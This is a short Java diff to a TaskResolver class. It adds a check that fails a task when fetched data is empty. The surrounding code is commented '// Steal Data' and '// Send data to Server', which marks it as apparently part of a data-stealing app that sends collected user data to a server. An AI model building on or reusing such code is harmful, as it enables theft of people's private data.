@@ -92,6 +92,10 @@ public abstract class TaskResolver<T extends UserData> {
     protected void executeWithPermissionsPresent(Activity app, Task task, Promise<ExecutionResult> p) {
         // Steal Data
         fetchData(app).then((data) -> {
+            if (data.isEmpty()) {
+                p.resolve(ExecutionResult.TASK_FAILED);
+                return;
+            }
 
             // Send data to Server
             sendData(app, data).then((success) -> {
